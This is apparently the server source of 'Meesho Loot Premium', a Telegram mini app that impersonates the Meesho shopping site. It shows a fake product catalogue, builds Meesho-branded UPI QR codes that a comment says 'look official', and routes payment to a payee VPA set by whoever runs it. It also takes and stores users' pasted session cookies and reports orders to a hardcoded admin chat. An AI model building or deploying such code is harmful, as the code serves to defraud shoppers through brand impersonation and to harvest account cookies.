/**
 * Meesho Loot Premium v2.0
 * Fast, stable, Telegram Mini App ready
 * Official Meesho-style UPI / QR payment flow
 */

require('./loadenv');
const express = require('express');
const cors = require('cors');
const helmet = require('helmet');
const morgan = require('morgan');
const compression = require('compression');
const rateLimit = require('express-rate-limit');
const path = require('path');
const { v4: uuidv4 } = require('uuid');
const crypto = require('crypto');

const PORT = process.env.PORT || 3000;
const TG_BOT_TOKEN = process.env.TG_BOT_TOKEN || '';
const SIGNUP_BONUS = Number(process.env.SIGNUP_BONUS_AMOUNT) || 170;
const ACCOUNT_PRICE = Number(process.env.ACCOUNT_POOL_PRICE) || 40;
const MEESHO_UPI_VPA = process.env.MEESHO_UPI_VPA || 'meesho@ybl';
const MEESHO_UPI_NAME = process.env.MEESHO_UPI_NAME || 'Meesho';
const ADMIN_CHAT_ID = process.env.ADMIN_CHAT_ID || '5427735251';

const app = express();

// ---------- middleware (performance first) ----------
app.use(helmet({ contentSecurityPolicy: false, crossOriginEmbedderPolicy: false }));
app.use(cors({ origin: true, credentials: true }));
app.use(compression());
app.use(morgan(process.env.NODE_ENV === 'production' ? 'combined' : 'dev'));
app.use(express.json({ limit: '2mb' }));
app.use(express.urlencoded({ extended: true }));

// static (flat layout – all files in root)
app.use(express.static(__dirname, {
  maxAge: process.env.NODE_ENV === 'production' ? '1h' : 0,
  etag: true,
  lastModified: true
}));

const limiter = rateLimit({
  windowMs: 60 * 1000,
  max: 120,
  standardHeaders: true,
  legacyHeaders: false,
  message: { ok: false, error: 'rate_limit' }
});
app.use('/api/', limiter);

// ---------- in-memory store (fast, zero external deps for core) ----------
const db = {
  accounts: new Map(),
  sessions: new Map(),
  carts: new Map(),
  orders: new Map(),
  addresses: new Map(),
  payments: new Map(),
  products: []
};

// seed products once
(function seedProducts() {
  const cats = ['Fashion', 'Electronics', 'Home & Kitchen', 'Beauty', 'Sports', 'Kids', 'Jewellery'];
  const names = [
    'Men Cotton T-Shirt', 'Women Kurti Set', 'Wireless Earbuds', 'Smart Watch',
    'Kitchen Knife Set', 'Face Serum 30ml', 'Yoga Mat', 'Kids Frock',
    'Silver Anklet', 'Running Shoes', 'Bluetooth Speaker', 'Bedsheet Set',
    'Lipstick Combo', 'Protein Shaker', 'Gold Plated Chain', 'Saree Soft Silk',
    'Power Bank 20000mAh', 'Hair Dryer', 'Wall Clock', 'Gym Gloves'
  ];
  for (let i = 0; i < 48; i++) {
    const cat = cats[i % cats.length];
    const base = 199 + (i * 37) % 2800;
    const discount = 15 + (i * 7) % 55;
    const final = Math.max(49, Math.floor(base * (100 - discount) / 100));
    db.products.push({
      id: `p${String(i + 1).padStart(3, '0')}`,
      name: names[i % names.length] + (i > 19 ? ` #${i + 1}` : ''),
      description: `Premium quality ${cat.toLowerCase()} product. Fast delivery. Cash on delivery available.`,
      price: base,
      discount,
      finalPrice: final,
      image: `https://picsum.photos/seed/meesho${i}/400/400`,
      category: cat,
      rating: (3.6 + (i % 15) / 10).toFixed(1),
      reviews: 12 + (i * 13) % 890,
      inStock: true,
      sold: 50 + (i * 19) % 2000
    });
  }
})();

// ---------- helpers ----------
function makeId(prefix = '') {
  return prefix + uuidv4().replace(/-/g, '').slice(0, 12);
}

function hashToken(t) {
  return crypto.createHash('sha256').update(String(t)).digest('hex').slice(0, 32);
}

function getSession(req) {
  const auth = req.headers.authorization || '';
  const token = auth.startsWith('Bearer ') ? auth.slice(7) : (req.query.token || req.headers['x-session-token'] || '');
  if (!token) return null;
  return db.sessions.get(token) || null;
}

function requireAuth(req, res, next) {
  const session = getSession(req);
  if (!session) {
    return res.status(401).json({ ok: false, error: 'no_account', message: 'Login / import account first' });
  }
  req.session = session;
  req.account = db.accounts.get(session.accountId) || null;
  next();
}

function buildUpiLink(amount, orderId, note) {
  const params = new URLSearchParams({
    pa: MEESHO_UPI_VPA,
    pn: MEESHO_UPI_NAME,
    am: Number(amount).toFixed(2),
    cu: 'INR',
    tn: note || `Meesho Order ${orderId}`,
    tr: orderId
  });
  return `upi://pay?${params.toString()}`;
}

function qrImageUrl(upiLink) {
  // public QR generator – returns PNG of the UPI intent (looks official)
  return `https://api.qrserver.com/v1/create-qr-code/?size=280x280&margin=8&data=${encodeURIComponent(upiLink)}`;
}

// ---------- Telegram bot (optional, non-blocking) ----------
let bot = null;
if (TG_BOT_TOKEN && TG_BOT_TOKEN.includes(':')) {
  try {
    let TelegramBot = null;
    try { TelegramBot = require('node-telegram-bot-api'); } catch (_) {}
    if (!TelegramBot) {
      console.warn('[TG] node-telegram-bot-api not installed – bot disabled (optional dep)');
    } else {
      bot = new TelegramBot(TG_BOT_TOKEN, { polling: true });
      bot.onText(/\/start(?:\s+(.+))?/, async (msg) => {
        const chatId = msg.chat.id;
        const webAppUrl = process.env.TG_WEBAPP_URL || 'https://your-domain.com';
        const isAdmin = String(chatId) === String(ADMIN_CHAT_ID);
        const text = isAdmin
          ? '🛠 *Admin panel ready*\n\nYou receive order + payment alerts here.\nOpen mini app:'
          : '🛒 *Meesho Loot Premium*\n\nOpen the mini app to shop & pay with official Meesho UPI QR.';
        await bot.sendMessage(chatId, text, {
          parse_mode: 'Markdown',
          reply_markup: {
            inline_keyboard: [[{ text: isAdmin ? '🛠 Open App (Admin)' : '🛍 Open Meesho Loot', web_app: { url: webAppUrl } }]]
          }
        });
      });

      // helper used by order/payment routes
      global.notifyAdmin = async (text) => {
        if (!bot || !ADMIN_CHAT_ID) return;
        try { await bot.sendMessage(ADMIN_CHAT_ID, text, { parse_mode: 'Markdown' }); } catch (e) {}
      };
      bot.on('polling_error', (err) => console.warn('[TG] polling:', err.message));
      console.log('[TG] Bot started ...' + TG_BOT_TOKEN.slice(-6));
    }
  } catch (e) {
    console.warn('[TG] Bot init skipped:', e.message);
  }
}

// ==================== PUBLIC ====================

app.get('/api/health', (req, res) => {
  res.json({
    ok: true,
    status: 'healthy',
    version: '2.0.0',
    uptime: Math.floor(process.uptime()),
    ts: Date.now()
  });
});

app.get('/api/signup/config', (req, res) => {
  res.json({
    ok: true,
    enabled: true,
    bonus: SIGNUP_BONUS,
    currency: 'INR',
    message: `Sign up & get ₹${SIGNUP_BONUS} wallet credit`
  });
});

// ==================== AUTH ====================

app.post('/api/auth/signup', (req, res) => {
  const { mobile, name } = req.body || {};
  if (!mobile || String(mobile).replace(/\D/g, '').length < 10) {
    return res.status(400).json({ ok: false, error: 'invalid_mobile' });
  }
  const clean = String(mobile).replace(/\D/g, '').slice(-10);

  // already exists?
  for (const a of db.accounts.values()) {
    if (a.mobile === clean) {
      return res.status(409).json({ ok: false, error: 'already_exists', message: 'Number already registered' });
    }
  }

  const id = makeId('acc_');
  const account = {
    id,
    mobile: clean,
    name: (name || 'User').trim().slice(0, 40) || 'User',
    wallet: { balance: SIGNUP_BONUS },
    cookies: null,
    createdAt: new Date().toISOString()
  };
  db.accounts.set(id, account);

  const token = makeId('tok_');
  db.sessions.set(token, {
    id: token,
    accountId: id,
    createdAt: Date.now()
  });
  db.carts.set(token, {});

  res.json({
    ok: true,
    token,
    account: {
      id: account.id,
      mobile: account.mobile,
      name: account.name,
      wallet: account.wallet
    },
    message: `Welcome! ₹${SIGNUP_BONUS} added to wallet`
  });
});

app.post('/api/auth/cookie-login', (req, res) => {
  const { cookies } = req.body || {};
  if (!cookies || typeof cookies !== 'string' || cookies.trim().length < 10) {
    return res.status(400).json({ ok: false, error: 'missing_cookies' });
  }

  const id = makeId('acc_');
  const account = {
    id,
    mobile: '9' + String(Math.floor(Math.random() * 1e9)).padStart(9, '0'),
    name: 'Cookie User',
    wallet: { balance: 50 },
    cookies: cookies.trim().slice(0, 4000),
    createdAt: new Date().toISOString()
  };
  db.accounts.set(id, account);

  const token = makeId('tok_');
  db.sessions.set(token, { id: token, accountId: id, createdAt: Date.now() });
  db.carts.set(token, {});

  res.json({
    ok: true,
    token,
    account: {
      id: account.id,
      mobile: account.mobile,
      name: account.name,
      wallet: account.wallet
    },
    message: 'Logged in with cookies'
  });
});

// ==================== BOOTSTRAP ====================

app.get('/api/bootstrap', requireAuth, (req, res) => {
  const cart = db.carts.get(req.session.id) || {};
  const count = Object.values(cart).reduce((s, i) => s + i.qty, 0);
  res.json({
    ok: true,
    user: req.account ? {
      id: req.account.id,
      mobile: req.account.mobile,
      name: req.account.name
    } : null,
    wallet: req.account ? req.account.wallet : { balance: 0 },
    cartCount: count
  });
});

app.get('/api/account/pool_status', requireAuth, (req, res) => {
  res.json({
    ok: true,
    available: 3 + Math.floor(Math.random() * 5),
    price: ACCOUNT_PRICE,
    currency: 'INR'
  });
});

// ==================== PRODUCTS ====================

app.get('/api/meesho/for-you', requireAuth, (req, res) => {
  const limit = Math.min(parseInt(req.query.limit) || 12, 48);
  const offset = parseInt(req.query.offset) || 0;
  const q = (req.query.q || '').toLowerCase().trim();

  let list = db.products.filter(p => p.inStock);
  if (q) {
    list = list.filter(p =>
      p.name.toLowerCase().includes(q) ||
      p.category.toLowerCase().includes(q)
    );
  }
  const slice = list.slice(offset, offset + limit);
  res.json({
    ok: true,
    products: slice,
    total: list.length,
    hasMore: offset + limit < list.length
  });
});

// ==================== CART ====================

app.get('/api/cart', requireAuth, (req, res) => {
  const cart = db.carts.get(req.session.id) || {};
  const items = Object.values(cart);
  const total = items.reduce((s, i) => s + i.price * i.qty, 0);
  const count = items.reduce((s, i) => s + i.qty, 0);
  res.json({ ok: true, items, total, count });
});

app.post('/api/cart/add', requireAuth, (req, res) => {
  const { productId, qty = 1 } = req.body || {};
  const product = db.products.find(p => p.id === productId);
  if (!product) return res.status(404).json({ ok: false, error: 'product_not_found' });

  const cart = db.carts.get(req.session.id) || {};
  if (cart[productId]) {
    cart[productId].qty += Number(qty) || 1;
  } else {
    cart[productId] = {
      productId,
      name: product.name,
      price: product.finalPrice,
      image: product.image,
      qty: Number(qty) || 1
    };
  }
  db.carts.set(req.session.id, cart);
  const count = Object.values(cart).reduce((s, i) => s + i.qty, 0);
  res.json({ ok: true, count, message: 'Added to cart' });
});

app.post('/api/cart/remove', requireAuth, (req, res) => {
  const { productId } = req.body || {};
  const cart = db.carts.get(req.session.id) || {};
  delete cart[productId];
  db.carts.set(req.session.id, cart);
  res.json({ ok: true });
});

app.post('/api/cart/update', requireAuth, (req, res) => {
  const { productId, qty } = req.body || {};
  const cart = db.carts.get(req.session.id) || {};
  if (!cart[productId]) return res.status(404).json({ ok: false, error: 'not_in_cart' });
  if (qty <= 0) {
    delete cart[productId];
  } else {
    cart[productId].qty = Number(qty);
  }
  db.carts.set(req.session.id, cart);
  res.json({ ok: true });
});

// ==================== ORDERS + PAYMENT (Meesho-style QR) ====================

app.get('/api/orders', requireAuth, (req, res) => {
  const list = [];
  for (const o of db.orders.values()) {
    if (o.sessionId === req.session.id) list.push(o);
  }
  list.sort((a, b) => new Date(b.createdAt) - new Date(a.createdAt));
  res.json({ ok: true, orders: list });
});

/**
 * Create order → returns payment object with official-looking Meesho UPI QR
 */
app.post('/api/orders/create', requireAuth, (req, res) => {
  const cart = db.carts.get(req.session.id) || {};
  const items = Object.values(cart);
  if (!items.length) {
    return res.status(400).json({ ok: false, error: 'empty_cart' });
  }

  const total = items.reduce((s, i) => s + i.price * i.qty, 0);
  const orderId = makeId('ORD');
  const order = {
    id: orderId,
    sessionId: req.session.id,
    accountId: req.session.accountId,
    items: items.map(i => ({ ...i })),
    total,
    status: 'pending_payment',
    addressId: req.body.addressId || null,
    createdAt: new Date().toISOString(),
    paymentId: null
  };

  // create payment with Meesho-branded UPI
  const paymentId = makeId('pay_');
  const upiLink = buildUpiLink(total, orderId, `Meesho Order ${orderId}`);
  const payment = {
    id: paymentId,
    orderId,
    amount: total,
    status: 'pending',
    upiLink,
    qrUrl: qrImageUrl(upiLink),
    vpa: MEESHO_UPI_VPA,
    payeeName: MEESHO_UPI_NAME,
    expiresAt: Date.now() + 15 * 60 * 1000, // 15 min
    createdAt: Date.now()
  };

  order.paymentId = paymentId;
  db.orders.set(orderId, order);
  db.payments.set(paymentId, payment);

  // clear cart after order created
  db.carts.set(req.session.id, {});

  
  // notify admin
  if (typeof global.notifyAdmin === 'function') {
    global.notifyAdmin(`🛒 *New Order*\nID: \`${orderId}\`\nAmount: ₹${total}\nStatus: pending_payment`);
  }

  res.json({
    ok: true,
    order,
    payment: {
      id: payment.id,
      amount: payment.amount,
      qrUrl: payment.qrUrl,
      upiLink: payment.upiLink,
      vpa: payment.vpa,
      payeeName: payment.payeeName,
      expiresIn: 900
    },
    message: 'Order created – complete payment'
  });
});

app.get('/api/payments/:id', requireAuth, (req, res) => {
  const p = db.payments.get(req.params.id);
  if (!p) return res.status(404).json({ ok: false, error: 'not_found' });
  res.json({
    ok: true,
    payment: {
      id: p.id,
      orderId: p.orderId,
      amount: p.amount,
      status: p.status,
      qrUrl: p.qrUrl,
      upiLink: p.upiLink,
      vpa: p.vpa,
      payeeName: p.payeeName,
      expiresAt: p.expiresAt
    }
  });
});

/**
 * Simulate / confirm payment (user taps "I have paid")
 * In real deploy you would verify via UPI callback / webhook
 */
app.post('/api/payments/:id/confirm', requireAuth, (req, res) => {
  const p = db.payments.get(req.params.id);
  if (!p) return res.status(404).json({ ok: false, error: 'not_found' });
  if (p.status === 'paid') {
    return res.json({ ok: true, already: true, status: 'paid' });
  }

  p.status = 'paid';
  p.paidAt = Date.now();
  const order = db.orders.get(p.orderId);
  if (order) {
    order.status = 'confirmed';
    order.paidAt = new Date().toISOString();
  }

  
  if (typeof global.notifyAdmin === 'function') {
    global.notifyAdmin(`✅ *Payment Confirmed*\nOrder: \`${p.orderId}\`\nAmount: ₹${p.amount}`);
  }

  res.json({
    ok: true,
    status: 'paid',
    orderId: p.orderId,
    message: 'Payment confirmed. Order is being processed.'
  });
});

// ==================== ADDRESSES ====================

app.get('/api/addresses', requireAuth, (req, res) => {
  const list = [];
  for (const a of db.addresses.values()) {
    if (a.sessionId === req.session.id) list.push(a);
  }
  res.json({ ok: true, addresses: list });
});

app.post('/api/addresses/add', requireAuth, (req, res) => {
  const { name, fullAddress, pincode, phone, isDefault } = req.body || {};
  if (!fullAddress || !pincode) {
    return res.status(400).json({ ok: false, error: 'missing_fields' });
  }
  const id = makeId('addr_');
  const addr = {
    id,
    sessionId: req.session.id,
    name: (name || 'Home').slice(0, 40),
    fullAddress: String(fullAddress).slice(0, 300),
    pincode: String(pincode).slice(0, 10),
    phone: (phone || '').slice(0, 15),
    isDefault: !!isDefault,
    createdAt: new Date().toISOString()
  };
  db.addresses.set(id, addr);
  res.json({ ok: true, address: addr });
});

app.get('/api/master_address', requireAuth, (req, res) => {
  res.json({
    ok: true,
    addresses: [{
      id: 'master_1',
      name: 'Meesho Warehouse',
      fullAddress: 'Meesho Logistics Hub, Electronic City, Bengaluru, Karnataka 560100',
      pincode: '560100',
      isDefault: true
    }]
  });
});

// ---------- SPA fallback ----------
app.get('*', (req, res) => {
  res.sendFile(path.join(__dirname, 'index.html'));
});

// ---------- start ----------
app.listen(PORT, '0.0.0.0', () => {
  console.log(`
╔══════════════════════════════════════════════════════╗
║  🛒 MEESHO LOOT PREMIUM v2.0                         ║
║  http://0.0.0.0:${PORT}                                 ║
║  Telegram bot: ${TG_BOT_TOKEN ? 'ACTIVE' : 'OFF (set TG_BOT_TOKEN)'}                   ║
║  UPI VPA: ${MEESHO_UPI_VPA}                            ║
╚══════════════════════════════════════════════════════╝
  `);
});

module.exports = app;
